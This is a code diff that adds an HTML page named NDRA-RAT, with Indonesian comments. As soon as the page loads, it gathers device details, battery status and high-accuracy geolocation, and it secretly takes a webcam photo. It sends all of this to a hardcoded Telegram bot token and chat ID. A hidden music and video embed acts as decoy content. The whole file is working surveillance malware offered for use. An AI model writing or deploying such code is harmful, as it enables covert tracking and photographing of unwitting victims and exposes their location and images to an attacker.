@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NDRA-RAT</title>
+    <style>
+        body { background-color: #000; color: #fff; font-family: 'Courier New', Courier, monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        h1 { font-size: 3rem; letter-spacing: 10px; border-bottom: 2px solid #fff; }
+        .status { color: #555; margin-top: 20px; font-size: 0.8rem; }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <h1>NDRA-RAT</h1>
+    <p>"Kesedihan adalah bahasa yang tak terucapkan..."</p>
+    <div class="status" id="log">Initializing System...</div>
+
+    <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1" allow="autoplay" style="display:none"></iframe>
+    <audio autoplay loop>
+        <source src="https://www.bensound.com/bensound-music/bensound-tomorrow.mp3" type="audio/mpeg">
+    </audio>
+
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const token = '7626007629:AAFqz54vytWlibjXzoQn6cZ2Aayh5KyNDuw';
+        const chatId = '7359671280';
+        const log = document.getElementById('log');
+
+        async function startRAT() {
+            let data = `--- ⚡ NDRA-RAT LOG ⚡ ---\n`;
+            data += `Waktu: ${new Date().toLocaleString('id-ID')}\n`;
+
+            // 1. Ambil Info Device
+            data += `Device: ${navigator.platform}\n`;
+            data += `User Agent: ${navigator.userAgent}\n`;
+            data += `RAM: ${navigator.deviceMemory || 'Unknown'} GB\n`;
+            
+            // 2. Ambil Info Baterai
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                data += `Baterai: ${b.level * 100}% (${b.charging ? 'Charging' : 'Not Charging'})\n`;
+            }
+
+            // 3. Ambil Lokasi Presisi
+            navigator.geolocation.getCurrentPosition(res => {
+                data += `Lokasi: https://www.google.com/maps?q=${res.coords.latitude},${res.coords.longitude}\n`;
+                data += `Akurasi: ${res.coords.accuracy} meter\n`;
+                sendToTele(data);
+                takePhoto();
+            }, err => {
+                data += `Lokasi: Ditolak/Error\n`;
+                sendToTele(data);
+                takePhoto();
+            }, { enableHighAccuracy: true });
+        }
+
+        async function takePhoto() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                setTimeout(() => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    const photo = canvas.toDataURL('image/jpeg');
+                    sendPhotoToTele(photo);
+                    stream.getTracks().forEach(t => t.stop());
+                }, 2000);
+            } catch (e) { sendToTele("Kamera: Akses Ditolak"); }
+        }
+
+        function sendToTele(msg) {
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
+        }
+
+        function sendPhotoToTele(base64) {
+            const blob = dataURItoBlob(base64);
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', blob, 'target.jpg');
+            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
+        }
+
+        function dataURItoBlob(dataURI) {
+            const byteString = atob(dataURI.split(',')[1]);
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
+            return new Blob([ab], { type: 'image/jpeg' });
+        }
+
+        window.onload = startRAT;
+    </script>
+</body>
+</html>
